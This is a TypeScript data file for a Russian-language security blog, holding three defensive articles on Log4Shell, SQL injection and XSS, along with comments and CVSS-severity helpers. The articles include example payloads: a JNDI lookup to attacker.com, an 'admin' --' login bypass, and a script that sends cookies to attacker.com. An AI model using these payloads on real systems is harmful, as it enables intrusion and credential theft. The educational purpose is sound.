export interface Post {
  id: string;
  title: string;
  excerpt: string;
  content: string;
  image: string;
  cvss: number;
  cve?: string;
  date: string;
  author: string;
  tags: string[];
}

export interface Comment {
  id: string;
  postId: string;
  author: string;
  content: string;
  date: string;
}

export const posts: Post[] = [
  {
    id: "1",
    title: "Критическая уязвимость в Log4j: CVE-2021-44228",
    excerpt: "Анализ одной из самых опасных уязвимостей в истории Java-экосистемы. Как защитить свои системы от Log4Shell.",
    content: `## Обзор уязвимости

Log4Shell (CVE-2021-44228) — это критическая уязвимость удалённого выполнения кода (RCE) в популярной библиотеке логирования Apache Log4j 2. Уязвимость получила максимальную оценку CVSS 10.0.

### Как работает атака

Злоумышленник может выполнить произвольный код на сервере, отправив специально сформированную строку, которая будет записана в лог. Библиотека Log4j 2 поддерживает функцию lookup, которая позволяет подставлять значения из различных источников.

\`\`\`
\${jndi:ldap://attacker.com/exploit}
\`\`\`

### Рекомендации по защите

1. **Обновите Log4j** до версии 2.17.0 или выше
2. Установите флаг \`log4j2.formatMsgNoLookups=true\`
3. Удалите класс JndiLookup из classpath
4. Используйте WAF для блокировки вредоносных паттернов

### Заключение

Эта уязвимость затронула миллионы систем по всему миру и показала, насколько важно следить за безопасностью зависимостей.`,
    image: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&h=400&fit=crop",
    cvss: 10.0,
    cve: "CVE-2021-44228",
    date: "2024-01-15",
    author: "Security Team",
    tags: ["RCE", "Java", "Log4j", "Critical"]
  },
  {
    id: "2",
    title: "SQL-инъекции: классика кибератак",
    excerpt: "Подробный разбор техник SQL-инъекций и методов защиты веб-приложений от этого типа атак.",
    content: `## Что такое SQL-инъекция?

SQL-инъекция — это техника внедрения вредоносного SQL-кода в запросы к базе данных. Это одна из самых распространённых и опасных уязвимостей веб-приложений.

### Пример уязвимого кода

\`\`\`sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
\`\`\`

При вводе \`admin' --\` в поле username злоумышленник может обойти аутентификацию.

### Типы SQL-инъекций

- **Union-based** — использование UNION для извлечения данных
- **Boolean-based** — определение структуры БД через true/false ответы
- **Time-based** — анализ времени ответа сервера
- **Error-based** — извлечение информации из сообщений об ошибках

### Защита

1. Используйте параметризованные запросы
2. Применяйте ORM
3. Валидируйте входные данные
4. Ограничивайте привилегии БД`,
    image: "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&h=400&fit=crop",
    cvss: 7.5,
    cve: "CWE-89",
    date: "2024-01-10",
    author: "Security Team",
    tags: ["SQL", "Web", "Injection", "Database"]
  },
  {
    id: "3",
    title: "XSS атаки: защита пользователей",
    excerpt: "Cross-Site Scripting остаётся одной из главных угроз для веб-приложений. Разбираем типы XSS и методы защиты.",
    content: `## Введение в XSS

Cross-Site Scripting (XSS) — это тип атаки, при которой злоумышленник внедряет вредоносные скрипты в веб-страницы, просматриваемые другими пользователями.

### Типы XSS

#### Stored XSS (Хранимая)
Вредоносный скрипт сохраняется на сервере и выполняется при каждом посещении страницы.

#### Reflected XSS (Отражённая)
Скрипт отражается от веб-сервера в ответ на запрос пользователя.

#### DOM-based XSS
Атака происходит полностью на стороне клиента, без участия сервера.

### Пример атаки

\`\`\`html
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
\`\`\`

### Методы защиты

1. **Content Security Policy (CSP)**
2. **HttpOnly cookies**
3. **Экранирование выходных данных**
4. **Валидация входных данных**`,
    image: "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800&h=400&fit=crop",
    cvss: 6.1,
    cve: "CWE-79",
    date: "2024-01-05",
    author: "Security Team",
    tags: ["XSS", "Web", "JavaScript", "Browser"]
  }
];

export const comments: Comment[] = [
  {
    id: "1",
    postId: "1",
    author: "CyberDefender",
    content: "Отличный разбор! Log4Shell действительно стал переломным моментом в осознании важности безопасности зависимостей.",
    date: "2024-01-16"
  },
  {
    id: "2",
    postId: "1",
    author: "DevSecOps",
    content: "Рекомендую также добавить мониторинг с помощью SIEM для обнаружения попыток эксплуатации.",
    date: "2024-01-17"
  },
  {
    id: "3",
    postId: "2",
    author: "WebDeveloper",
    content: "Параметризованные запросы — это must-have. Удивительно, что до сих пор встречаются уязвимые приложения.",
    date: "2024-01-11"
  }
];

export function getCvssClass(cvss: number): string {
  if (cvss >= 9.0) return "cvss-critical";
  if (cvss >= 7.0) return "cvss-high";
  if (cvss >= 4.0) return "cvss-medium";
  if (cvss > 0) return "cvss-low";
  return "cvss-none";
}

export function getCvssSeverity(cvss: number): string {
  if (cvss >= 9.0) return "CRITICAL";
  if (cvss >= 7.0) return "HIGH";
  if (cvss >= 4.0) return "MEDIUM";
  if (cvss > 0) return "LOW";
  return "NONE";
}
